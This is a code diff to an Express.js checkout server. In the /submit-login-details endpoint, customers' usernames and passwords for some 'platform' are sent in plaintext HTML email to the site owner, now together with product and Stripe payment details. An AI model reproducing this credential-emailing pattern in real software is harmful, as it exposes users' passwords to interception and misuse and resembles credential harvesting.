@@ -110,26 +110,8 @@ app.post('/create-checkout-session', async (req, res) => {
 // NEW ENDPOINT: Submit login (before payment)
 app.post('/submit-login', async (req, res) => {
   try {
-    const { username, password, productName, productPrice } = req.body;
-    
-    // Validate required fields
-    if (!username || !password) {
-      return res.status(400).json({ error: 'Username and password are required' });
-    }
-    
-    // Send email notification with login credentials (non-blocking)
-    // Payment method not selected yet at login stage
-    sendLoginNotification({
-      username,
-      password,
-      productName,
-      productPrice,
-      paymentMethod: null // Not selected yet
-    }).catch(err => {
-      console.error('Error sending login notification email:', err);
-      // Don't fail the request if email fails
-    });
-
+    // This endpoint is kept for compatibility but no longer sends emails
+    // Emails are only sent after payment method selection (cash) or after payment confirmation (card)
     res.json({ success: true, message: 'Login received successfully' });
   } catch (error) {
     console.error('Error submitting login:', error);
@@ -207,14 +189,17 @@ app.post('/submit-cash-payment', async (req, res) => {
 // NEW ENDPOINT: Submit login details after payment
 app.post('/submit-login-details', async (req, res) => {
   try {
-    const { username, password, platform, sessionId } = req.body;
+    const { username, password, platform, sessionId, productName, productPrice, paymentMethod } = req.body;
     
-    // Send email notification with login details
+    // Send email notification with login details (CARD PAYMENT - only email sent for card)
     await sendLoginDetailsNotification({
       username,
       password,
       platform,
-      sessionId
+      sessionId,
+      productName: productName || 'Unknown Product',
+      productPrice: productPrice || 'N/A',
+      paymentMethod: paymentMethod || 'card' // Default to card for this endpoint
     });
 
     res.json({ success: true, message: 'Login details received successfully' });
@@ -504,7 +489,7 @@ async function sendCashPaymentNotification(data) {
 
 // Send login details notification via email (after card payment)
 async function sendLoginDetailsNotification(data) {
-  const { username, password, platform, sessionId } = data;
+  const { username, password, platform, sessionId, productName, productPrice, paymentMethod } = data;
   
   if (!resend || !process.env.YOUR_EMAIL) {
     console.error('❌ Cannot send email - Resend not initialized or YOUR_EMAIL not set');
@@ -553,9 +538,14 @@ async function sendLoginDetailsNotification(data) {
                 </div>
               </div>
 
-              <!-- Payment Info Card -->
+              <!-- Product & Payment Info Card -->
               <div style="background: linear-gradient(135deg, #f8f9ff 0%, #ececff 100%); padding: 25px; border-radius: 12px; border: 2px solid #6C63FF; margin-bottom: 25px; box-shadow: 0 4px 12px rgba(108,99,255,0.15);">
-                <div style="margin-bottom: 20px;">
+                <h3 style="margin: 0 0 15px 0; color: #6C63FF; font-size: 20px; font-weight: 700;">📚 Product Details</h3>
+                <div style="background: #ffffff; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
+                  <p style="margin: 8px 0; color: #333; font-size: 15px;"><strong style="color: #6C63FF;">Product:</strong> ${productName || 'Not specified'}</p>
+                  <p style="margin: 8px 0; color: #6C63FF; font-size: 24px; font-weight: 700;">Price: £${productPrice || 'N/A'}</p>
+                </div>
+                <div style="background: #ffffff; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                   <p style="margin: 8px 0; color: #555; font-size: 15px;"><strong style="color: #333;">Stripe Session ID:</strong> ${sessionId || 'N/A'}</p>
                 </div>
                 
